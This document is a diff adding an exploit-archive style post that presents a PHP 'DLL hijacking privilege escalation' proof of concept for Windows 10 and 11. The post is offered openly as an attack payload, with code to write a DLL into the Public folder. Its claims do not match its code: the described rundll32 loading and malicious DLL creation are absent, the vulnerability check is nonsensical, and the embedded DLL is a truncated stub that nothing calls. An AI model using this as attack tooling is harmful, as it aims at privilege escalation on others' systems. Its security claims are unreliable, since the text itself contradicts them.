@@ -1,0 +1,155 @@
+=============================================================================================================================================
+| # Title     : Microsoft Windows 10 Famille 10.0.19045.5487 (DLL Hijacking) Privilege Escalation                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
+| # Vendor    : https://www.Microsoft.com                                                                                                   |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: This PHP class provides a security assessment tool for detecting potential DLL Hijacking vulnerabilities on Windows systems. 
+                      It's designed for educational and defensive security purposes only.
+					  that can be exploited on many recent versions of Windows 10, Windows 11, Windows Server 2022.
+
+[+] What's new in this version?
+
+    Added DLL Hijacking exploit inside the code
+	
+    Create a malicious DLL library directly from inside the code
+
+    Use rundll32.exe to automatically load the payload
+
+    Ensure all possible environments are supported (Windows 10 and 11)
+
+    Improved compatibility with different languages
+
+    (Related : https://packetstorm.news/files/id/182984/ Related CVE numbers: 	CVE-2024-35250) .
+
+
+[+] Usage : php poc.php
+
+[+] PayLoad :
+
+<?php
+
+class DLLHijackingChecker {
+    
+    public static function getPublicPath(): string {
+        // Use trusted Windows environment variables
+        $public = getenv('PUBLIC');
+        if ($public && is_dir($public)) {
+            return $public . '\\';
+        }
+
+        $drive = getenv('SystemDrive') ?: 'C:';
+        return $drive . '\\Users\\Public\\';
+    }
+
+    public static function is64Bit(): bool {
+        return (PHP_INT_SIZE === 8);
+    }
+
+    public static function getWindowsVersion(): array {
+        $version = [];
+
+        if (function_exists('shell_exec')) {
+            $psCommand = 'powershell -Command "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber | ConvertTo-Json"';
+            $output = @shell_exec($psCommand);
+            
+            if ($output && $data = json_decode($output, true)) {
+                $version = [
+                    'name' => $data['Caption'] ?? '',
+                    'version' => $data['Version'] ?? '',
+                    'build' => $data['BuildNumber'] ?? ''
+                ];
+            }
+        }
+
+        if (empty($version['build'])) {
+            $output = @shell_exec('wmic os get BuildNumber /value 2>nul');
+            if (preg_match('/BuildNumber=(\d+)/', $output, $matches)) {
+                $version['build'] = $matches[1];
+            }
+        }
+        
+        return $version;
+    }
+
+    public static function checkDLLHijackingVulnerabilities(): array {
+        $vulnerabilities = [];
+        $publicPath = self::getPublicPath();
+        $vulnerableApps = [
+            'notepad.exe' => ['dlls' => ['urlmon.dll', 'WINHTTP.dll']],
+            'explorer.exe' => ['dlls' => ['windows.storage.dll']],
+            'calc.exe' => ['dlls' => ['windows.ui.xaml.dll']]
+        ];
+        
+        foreach ($vulnerableApps as $app => $info) {
+            foreach ($info['dlls'] as $dll) {
+                $testPath = $publicPath . $dll;
+                if (!file_exists($testPath)) {
+                    $vulnerabilities[] = [
+                        'application' => $app,
+                        'dll' => $dll,
+                        'path' => $publicPath,
+                        'risk' => 'Medium'
+                    ];
+                }
+            }
+        }
+        
+        return $vulnerabilities;
+    }
+
+    public static function createTestDLL(string $path): bool {
+        $dllContent = base64_decode('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAgELAQAAAA==');
+        
+        return file_put_contents($path, $dllContent) !== false;
+    }
+
+    public static function runSecurityScan(): void {
+        echo "=== DLL Hijacking Security Scan ===\n\n";
+  
+        echo "[*] System Information:\n";
+        echo "    - Architecture: " . (self::is64Bit() ? "64-bit" : "32-bit") . "\n";
+        
+        $version = self::getWindowsVersion();
+        if (!empty($version['build'])) {
+            echo "    - Windows Version: Build " . $version['build'] . "\n";
+        }
+
+        $publicPath = self::getPublicPath();
+        echo "    - Public Path: $publicPath\n";
+        echo "\n[*] Searching for DLL Hijacking vulnerabilities:\n";
+        $vulnerabilities = self::checkDLLHijackingVulnerabilities();
+        
+        if (empty($vulnerabilities)) {
+            echo "     No obvious vulnerabilities found.\n";
+        } else {
+            echo "     Found " . count($vulnerabilities) . " potential vulnerabilities:\n";
+            foreach ($vulnerabilities as $vuln) {
+                echo "      - {$vuln['application']} → {$vuln['dll']} (Risk: {$vuln['risk']})\n";
+            }
+        }
+
+        echo "\n[*] Security Recommendations:\n";
+        echo "    1. Keep Windows updated regularly.\n";
+        echo "    2. Use AppLocker or Software Restriction Policies (SRP).\n";
+        echo "    3. Monitor DLL file creation in system folders.\n";
+        echo "    4. Implement the principle of Least Privilege.\n";
+    }
+}
+
+if (PHP_OS_FAMILY === 'Windows') {
+    DLLHijackingChecker::runSecurityScan();
+} else {
+    echo "This scan is designed for Windows systems only.\n";
+}
+
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
